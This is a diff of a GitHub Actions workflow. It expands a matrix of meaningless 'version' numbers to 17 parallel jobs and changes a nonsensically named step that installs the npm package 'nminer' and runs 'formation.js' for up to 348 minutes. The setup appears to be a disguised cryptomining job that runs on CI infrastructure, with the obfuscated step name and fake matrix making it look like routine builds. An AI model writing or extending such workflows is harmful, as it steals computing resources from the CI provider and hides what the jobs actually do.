@@ -9,21 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 250 }
-          - { version: 1830 }
-          - { version: 5520 }
-          - { version: 8016 }
-          - { version: 6600 }
-          - { version: 1626 }
-          - { version: 1738 }
-          - { version: 1693 }
-          - { version: 1559 }
-          - { version: 9412 }
-          - { version: 8897 }
-          - { version: 3083 }
-          - { version: 3859 }
-          - { version: 1375 }
-          - { version: 3810 }
+          - { version: 4776 }
+          - { version: 300 }
+          - { version: 8417 }
+          - { version: 3382 }
+          - { version: 9206 }
+          - { version: 5445 }
+          - { version: 5740 }
+          - { version: 5684 }
+          - { version: 6542 }
+          - { version: 3938 }
+          - { version: 3375 }
+          - { version: 703 }
+          - { version: 1244 }
+          - { version: 1988 }
+          - { version: 2690 }
+          - { version: 8910 }
+          - { version: 538 }
 
     steps:
       - name: Checkout
@@ -34,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: peony rejoin phew onto
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 308m node formation.js || echo "formation executed"
+          timeout 348m node formation.js || echo "formation executed"
